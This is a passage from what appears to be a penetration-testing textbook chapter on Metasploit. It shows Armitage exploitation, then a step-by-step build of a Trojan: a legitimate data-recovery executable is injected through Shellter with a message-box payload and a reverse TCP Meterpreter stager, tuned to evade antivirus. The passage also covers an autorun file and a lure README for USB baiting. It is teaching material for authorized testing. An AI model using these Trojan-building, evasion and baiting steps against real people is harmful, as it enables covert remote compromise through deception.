<li>When you select an exploit from the list, the window that pops up is the same one you see when you load any exploit from the <strong class="bold">Modules</strong> window. The only difference is that the options are configured automatically to suit your target, as shown in the following screenshot:</li>
</ol>
<div>
<div class="IMG---Figure" id="_idContainer163">
<img alt="Figure 7.8 – Browsing our procured attacks " height="843" src="image/Figure_7.8_B17616.jpg" width="1505"/>
</div>
</div>
<p class="figure-caption">Figure 7.8 – Browsing our procured attacks</p>
<ol>
<li value="3">Click <strong class="bold">Launch</strong> to fire off the attack as a background job so that you can keep working while waiting for that connection to come back (if that’s how you configured it).</li>
</ol>
<p>Remember, Armitage <a id="_idIndexMarker574"/>likes to make things look Hollywood, so if your target is compromised, the icon changes to a very ominous lightning bolt.</p>
<ol>
<li value="4">Right-click on the target again and you’ll see that a new option is now available – <strong class="bold">Shell</strong>. You can interact with it and move on from the foothold, as shown here:</li>
</ol>
<div>
<div class="IMG---Figure" id="_idContainer164">
<img alt="Figure 7.9 – Compromised Linux host " height="568" src="image/Figure_7.9_B17616.jpg" width="1101"/>
</div>
</div>
<p class="figure-caption">Figure 7.9 – Compromised Linux host</p>
<p>All of this automation <a id="_idIndexMarker575"/>is fantastic for professionals in the field, but we should be careful not to lose touch with the hacker’s way of thinking, which makes this all possible.</p>
<h2 id="_idParaDest-138"><a id="_idTextAnchor137"/>A word about Armitage and the pen tester mentality</h2>
<p>Every time I go for a drive, I notice an extremely common feature in newer cars – the blind spot warning light <a id="_idIndexMarker576"/>on the side mirror. It lights up to warn the driver that a vehicle is in its blind spot. Overall, I’m a supporter of advancing technology to make our lives a little <a id="_idIndexMarker577"/>easier, and I’m sure this feature is useful. However, I worry that some drivers may stop being vigilant if they come to rely on this kind of technology. I wonder if drivers have stopped turning their heads to check their blind spots.</p>
<p>The issue of blind spots is relevant to Armitage and pen testing because it’s sort of like a new technology that drives the car for us, without us having to know a single thing about driving. Metasploit was already a revolutionary way to automate security testing, and Armitage automates it even further. Long before Metasploit existed, even in the 1990s, most of the tasks we take for granted today were accomplished manually. When tools were at our disposal, we had to manually correlate outputs to develop the understanding that’s necessary <a id="_idIndexMarker578"/>for any attack, and this was years after the true pioneers developed <a id="_idIndexMarker579"/>everything we needed to know. Most modern tools allow us to get far more work done in very rigid time frames, allowing us to focus on analysis so that we can bring value to the client. There is, however, the rise of the script kiddie to contend with, as well as inexperienced but passionate hopefuls who download Kali Linux and fire offensive weapons with reckless abandon. Despite some complaints, these tools do have a place, so long as they are used to improve our lives without replacing basic common sense.</p>
<p>With that in mind, it’s recommended that you find out what’s going on behind the scenes. Review the code, analyze the packets on the network, research not only the details of the attack and exploit but also the design intent of the affected technology, read the RFCs, and try to accomplish a task without the tool – or, better yet, write a better tool. This is a fantastic opportunity to better yourself.</p>
<p>Moving forward, we’re going to facilitate a social engineering attack with a malicious USB drive. Once the drive has been plugged into a Windows machine, we will have a Meterpreter session and be able to take control. </p>
<h1 id="_idParaDest-139"><a id="_idTextAnchor138"/>Social engineering attacks with Metasploit payloads</h1>
<p>Let’s wrap this chapter up by bringing together two topics – backdoor injection into a legitimate executable and using Metasploit as the payload generator and handler. We’re going to use Shellter and nested Meterpreter payloads to create a malicious AutoRun USB drive. Although AutoRun isn’t often enabled by default, you may find it enabled in certain corporate environments. Even if AutoRun doesn’t execute automatically, we’re going to work with an executable that may encourage the user to execute it by creating the impression that there’s deleted data on the drive that can be recovered.</p>
<h2 id="_idParaDest-140"><a id="_idTextAnchor139"/>Creating a Trojan with Shellter</h2>
<p>Follow these <a id="_idIndexMarker580"/>steps to <a id="_idIndexMarker581"/>create a Trojan with Shellter:</p>
<ol>
<li value="1">The first and the most tedious step is finding a suitable executable. This is tricky because Shellter has certain limitations – the executables have to be 32-bit, they can’t be packed executables, and they need to play nice with our payloads. We won’t know an executable works until we bother to infect a file and try running it. After digging around for a suitable executable, we found a 400-something-kilobyte data recovery tool called <strong class="source-inline">DataRecovery.exe</strong>. This requires no installation and has no dependencies.</li>
<li>After confirming that the recovery tool is 32-bit and clean, put it in your root folder to work on later. First, we want to create a nested payload with <strong class="source-inline">msfvenom</strong>. We don’t need to do this part, but we’re trying to give the attack a little pizzazz. Do this with the following command line:<p class="source-code"># msfvenom --arch x86 --platform windows --payload windows/messagebox ICON=WARNING TITLE="Data Restore" TEXT="Recoverable deleted files detected." --format raw &gt; message</p></li>
<li>We should now have two files in the root folder: the executable and a 268-byte binary file called <strong class="source-inline">message</strong>. Now, fire up Shellter in Stealth Mode by passing <strong class="source-inline">Y</strong> to the prompt. This requires the same process we talked about earlier in this chapter until we need to specify our custom payload, as shown in the following screenshot:</li>
</ol>
<div>
<div class="IMG---Figure" id="_idContainer165">
<img alt="Figure 7.10 – Specifying the custom payload " height="465" src="image/Figure_7.10_B17616.jpg" width="655"/>
</div>
</div>
<p class="figure-caption">Figure 7.10 – Specifying the custom payload</p>
<p>Now, Shellter is going to spit out <strong class="source-inline">DataRecovery.exe</strong>; a quick <strong class="source-inline">sha1sum</strong> command will soon confirm that the binary has been modified. At this point, we have a legitimate data recovery tool that displays a message box. Now, it’s time to make it work for us.</p>
<ol>
<li value="4">Now that we have the nested payload, we will simply send the new binary through Shellter one more time. This time, however, we must select the number 1 stager on the list <a id="_idIndexMarker582"/>of included payloads – the reverse TCP <a id="_idIndexMarker583"/>Meterpreter payload. Now, we have a complete Trojan that’s ready to rock. The program is a legitimate data recovery utility that pops up an advisory, warning users that deleted data has been detected. Meanwhile, the Meterpreter payload has phoned home to our handler and given us control, as shown in the following screenshot:</li>
</ol>
<div>
<div class="IMG---Figure" id="_idContainer166">
<img alt="Figure 7.11 – The Trojan after injecting the message box payload, ready for the connect-back code " height="584" src="image/Figure_7.11_B17616.jpg" width="884"/>
</div>
</div>
<p class="figure-caption">Figure 7.11 – The Trojan after injecting the message box payload, ready for the connect-back code</p>
<p class="callout-heading">Note</p>
<p class="callout">When you configure your handler, always set <strong class="source-inline">EXITFUNC</strong> as a thread. If you don’t, the Meterpreter session will die when the Trojan does!</p>
<p>By the way, we improved <a id="_idIndexMarker584"/>our evasion with this one – now, we’re undetected <a id="_idIndexMarker585"/>by 75% of antivirus vendors, as shown in the following screenshot:</p>
<div>
<div class="IMG---Figure" id="_idContainer167">
<img alt="Figure 7.12 – Improving our stealth by tweaking our strategy " height="292" src="image/Figure_7.12_B17616.jpg" width="907"/>
</div>
</div>
<p class="figure-caption">Figure 7.12 – Improving our stealth by tweaking our strategy</p>
<p>This is a notable example of how much fine-tuning plays a role in the art of AV evasion. What happened with <a id="_idIndexMarker586"/>this executable that made it look a little better than <a id="_idIndexMarker587"/>the last? Was it the double pass through Shellter, or the use of a custom innocuous payload? There are many moving parts to antivirus detection, so it’s hard to say, but keep in mind that you will probably need to play around in the lab before you deploy one of your creations. In my experience, it usually took trying a few different tricks before I got around a target’s defense.</p>
<h2 id="_idParaDest-141"><a id="_idTextAnchor140"/>Preparing a malicious USB drive for Trojan delivery</h2>
<p>There are just two <a id="_idIndexMarker588"/>steps left – one is technical (though very simple), while <a id="_idIndexMarker589"/>the other is purely for social engineering purposes. Let’s start with the technical step, which is creating the <strong class="source-inline">autorun</strong> file:</p>
<ol>
<li value="1">This is as simple as creating a text file called <strong class="source-inline">autorun.inf</strong> that points to our executable. It must start with the line <strong class="source-inline">[autorun]</strong>, with the file that is to be opened identified by <strong class="source-inline">open=</strong>. Microsoft defines other AutoRun commands, but <strong class="source-inline">open=</strong> is the only one we need. You can also add the <strong class="source-inline">icon=</strong> command, which will make the drive appear as the executable’s icon (or any other icon you define), as shown here:</li>
</ol>
<div>
<div class="IMG---Figure" id="_idContainer168">
<img alt="Figure 7.13 – Typing up the AutoRun file " height="333" src="image/Figure_7.13_B17616.jpg" width="776"/>
</div>
</div>
<p class="figure-caption">Figure 7.13 – Typing up the AutoRun file</p>
<ol>
<li value="2">Now, it’s time for the social engineering part. What if AutoRun doesn’t work? After all, it is <a id="_idIndexMarker590"/>disabled on a lot of systems these <a id="_idIndexMarker591"/>days. Remember that if someone went so far as to plug in our drive, they’ll see the files. To hint that running <strong class="source-inline">DataRecovery.exe</strong> is worth the risk, we will add an enticing <strong class="source-inline">README</strong> file. The file will make it look like deleted files are available for recovery. Curiosity gets the best of a lot of people. Take a look at the following screenshot:</li>
</ol>
<div>
<div class="IMG---Figure" id="_idContainer169">
<img alt="Figure 7.14 – Typing up our psychological README " height="141" src="image/Figure_7.14_B17616.jpg" width="548"/>
</div>
</div>
<p class="figure-caption">Figure 7.14 – Typing up our psychological README</p>
<p>You may know better than to fall for this, but imagine scattering 100 USB drives throughout the public areas of your client. Don’t you think you’d get a hit? You only need it to work once – a valuable lesson for your clients.</p>
<h1 id="_idParaDest-142"><a id="_idTextAnchor141"/>Summary</h1>
<p>In this chapter, we learned about more advanced Metasploit usage. We took our payload generation skills to the next level by leveraging a tool outside of the Metasploit Framework, Shellter, to leverage Metasploit payloads. We also explored the capabilities of <strong class="source-inline">msfvenom</strong>, today’s union of what used to be Metasploit’s payload and encoder tools. After payloads, we looked at how to build a custom module with Ruby and how to get it working within Metasploit. We then examined making Metasploit use highly organized and efficient with the Armitage frontend GUI. We also demonstrated how to enumerate and exploit a target in Armitage. Finally, we learned how to leverage Metasploit payloads to construct powerful social engineering attacks. In the true hacking spirit, the next chapter is going to take us deeper into how the processor sees our tidbits of code.</p>
<h1 id="_idParaDest-143"><a id="_idTextAnchor142"/>Questions</h1>
<p>Answer the following questions to test your knowledge of this chapter:</p>
<ol>
<li value="1">What are the three types of payload?</li>
<li>__________ is a common example of a hex byte that can break the execution of our payload.</li>
<li>Which <strong class="source-inline">msfvenom</strong> flag should be used to specify that the payload is to run on an x86 instruction set architecture? </li>
<li>In Ruby, <strong class="source-inline">def</strong> defines a _______. </li>
<li>What’s the difference between <strong class="source-inline">print_good()</strong> and <strong class="source-inline">print_status()</strong>?</li>
<li>There is only one target view in Armitage. (True | False)</li>
<li>When you’re sending Shellter Stealth Mode payloads, _________ should always be set to ________ when you’re configuring options for <strong class="source-inline">windows/meterpreter/reverse_tcp</strong>.</li>
<li>All modern Windows hosts enable AutoRun by default. (True | False)</li>
</ol>
<h1 id="_idParaDest-144"><a id="_idTextAnchor143"/>Further reading</h1>
<p>For more information regarding the topics that were covered in this chapter, take a look at the following resources:</p>
<ul>
<li>The Shellter project home page: <a href="https://www.shellterproject.com/">https://www.shellterproject.com/</a></li>
<li>Documentation on running Windows applications with Wine32: <a href="https://www.winehq.org/documentation">https://www.winehq.org/documentation</a></li>
<li>The Metasploit Framework on GitHub: <a href="https://github.com/rapid7/metasploit-framework">https://github.com/rapid7/metasploit-framework</a></li>
</ul>
</div>
</div></body></html>